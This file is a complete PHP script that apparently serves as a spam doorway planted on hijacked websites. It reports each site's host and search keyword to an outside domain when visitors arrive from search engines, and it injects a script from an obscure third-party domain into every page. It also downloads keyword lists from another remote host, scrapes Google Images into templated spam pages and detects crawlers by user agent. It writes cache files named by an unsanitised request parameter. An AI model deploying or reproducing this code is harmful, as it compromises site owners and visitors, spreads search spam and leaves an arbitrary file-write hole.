<?php
error_reporting(0); 
if ((strpos($_SERVER['HTTP_REFERER'], "google")) OR (strpos($_SERVER['HTTP_REFERER'], "bing")) OR (strpos($_SERVER['HTTP_REFERER'], "yahoo")))
{
$d = $_SERVER["HTTP_HOST"];
$mykeys  = $_GET["yhsw"];

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://keocial.pw/sf/88/index.php?d=$d&mykeys=$mykeys");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$text = curl_exec($ch); 
curl_close($ch);

}

echo "<script type='text/javascript'> var sc_project=12021113; var sc_invisible=1; var sc_security='1151cdb1'; </script> <script type='text/javascript' src='https://www.statcounter.com/counter/counter.js' async></script> <noscript><div class='statcounter'><a title='Web Analytics' href='https://statcounter.com/' target='_blank'><img class='statcounter' src='https://c.statcounter.com/12021113/0/1151cdb1/1/' alt='Web Analytics'></a></div></noscript>";
echo "<script type='text/javascript' src='//rgvqcsxqge.com/21/25/b5/2125b5733cd8d7ca2d7009bbc9c46e05.js'></script>";	


$cache_folder = "blogs/wtuds";
$template_folder = "blogs/sotpie";
$keys3 = $_SERVER['SERVER_NAME'];
$link = "http://babeswow.pw/ks/$keys3.txt";
$dir = $_SERVER["SCRIPT_NAME"];
if ($_GET["yhsw"] == "") { $keys = file("blogs/page.txt"); $key = $keys[rand(0, sizeof($keys)-1)]; $key = chop($key); $_GET["yhsw"] = str_replace(" ", "-", $key); } 

$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}


	
	$myname = $cache_folder."/".$_GET["yhsw"];
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
$template = scandir($template_folder);
$template = $template[rand(2,sizeof($template)-1)];
$tpl = $template_folder."/".$template;
$tpl = file($tpl);


$keyword = str_replace("-", " ", $_GET["yhsw"]);
$keyword = chop($keyword);
$keyword = ucfirst($keyword);


 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));
 $query_pars_2 = mb_strtolower($query_pars_2);


 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://www.google.com/search?q=$query_pars_2&start=0&tbm=isch&gbv=2&gws_rd=ssl&hl=en&num=100&tbs=ift:jpg"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" );
$result = curl_exec($ch); 
curl_close($ch);

		preg_match_all('~"ou":"(.*)".*"tu":"(.*)"~isU',$result, $m);
	preg_match_all('~"pt":"(.*)".*"rh":"(.*)"~isU',$result, $mm);
	
	$text = "";
	
	for($i=0;$i<100;$i++)
		{
			
			$text = $text."<div class=\"grid\">
  <div class=\"imgholder\">
 <img src=\"".$m[1][$i]."\" />
  </a> </div>
  <p>".$mm[1][$i]."</p>
  </div>";
	$text = $text."\n\n\n";		
		}
	
if (!file_exists("keys.txt"))
{
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, $link); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" );
$result = curl_exec($ch); 
curl_close($ch);
$out_keys = fopen("keys.txt", "a");
fwrite($out_keys, "$result");
fclose($out_keys);		
}

	$keys = file("keys.txt");
	$text = explode("\n", $text);
	$text_new = "";
foreach ($text as $inn)
{
	//$inn = "    ".$inn;
	if (strpos($inn, "<img")) 
	{
		$key = chop($keys[rand(0,sizeof($keys))]);
		$key = str_replace(" ", "-", $key);
		$text_new = $text_new."<a href=$dir?yhsw=$key>";
		$text_new = $text_new.$inn; 
		$text_new = $text_new."</a>\n";
	}
	else $text_new = $text_new.$inn."\n";

}
 


     	$html = implode ("\n", $tpl);
/*		
$titlename = $_SERVER['SERVER_NAME'];	
$titlename = explode(".", $titlename);
$titlename = strtoupper($titlename[0]);
if (strlen($titlename)>1) $html=str_replace("<title>{keyword}</title>", "<title>$keyword | $titlename</title>", $html);		
	*/	
		$html = str_replace("{keyword}", $keyword, $html);
		$html = str_replace("{manytext_bing}", $text_new, $html);
		
		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);

		echo $html;
		
?>